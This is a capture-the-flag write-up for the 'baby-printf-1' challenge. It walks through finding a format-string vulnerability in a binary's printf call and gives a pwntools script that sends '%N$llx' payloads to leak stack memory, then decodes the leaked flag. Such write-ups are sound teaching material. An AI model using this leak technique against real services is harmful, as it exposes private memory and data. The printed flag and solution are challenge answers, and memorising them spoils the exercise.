# baby-printf-1
> Write-up author: jon-brandy
## DESCRIPTION:
Apakah kamu tau printf merupakan fungsi yang berbahaya jika digunakan dengan salah?

`nc 167.71.212.18 3587`
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212639804-c5da0452-a683-4a08-92f3-17ac3465d30d.png)


2. Jump to the `src` directory.

> INSIDE

![image](https://user-images.githubusercontent.com/70703371/212639895-4b7041e8-ab67-48ce-9c32-711f225f5250.png)


3. Check the file type.

> RESULT - ELF 64 BIT , not stripped

![image](https://user-images.githubusercontent.com/70703371/212639999-61ff5395-d3c2-4d3e-ae1a-aebb858ee943.png)


4. Now check the binary's protection.

> RESULT - Partial Relro

![image](https://user-images.githubusercontent.com/70703371/212640105-f945580d-2fa4-442e-a36a-cc7caea152e2.png)


5. Let's straight to decompile the binary.
6. Check the `vuln()` function.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/213633578-56b93772-25a8-49a2-b2a4-0cc860990830.png)


7. There's no bufferoverflow, but there's a **format string vulnerability**, the `printf()` function does not have any format specifier.
8. We can utilize this vuln to leak a variable value. So i made a python script to leak the value using pwntools:

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

for i in range(100):
    try:
        sh = start()
        sh.sendlineafter("?", '%{}$llx'.format(i))
        # get the leaked values
        sh.recvuntil("?") 
        res = sh.recvline()
        fin = str(res)
        # print it
        print(fin)
    except EOFError:
        pass

sh.interactive()
```

9. Run the script remotely and we got several hex values, i decode it manually and got the flag's prefix at the 8th iter.

![image](https://user-images.githubusercontent.com/70703371/215320402-e1395cce-d83b-46e6-a10b-601df5c845c3.png)


![image](https://user-images.githubusercontent.com/70703371/215320416-a47ae35f-da09-4e8f-b607-9dd328056a2a.png)


10. Decode the leaked hex start from the 8th iter to the 13th and got this reversed flag.

```
}1009_3ullav_3lba1rav_a_k43l_0t_ftnirp{P1PCT
```

11. Let's reverse it again.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/215320503-9b763ee2-a65f-4079-a22d-670f95dd939b.png)


12. Got the flag!

## FLAG

```
TCP1P{printf_t0_l34k_a_var1abl3_vallu3_9001}
```





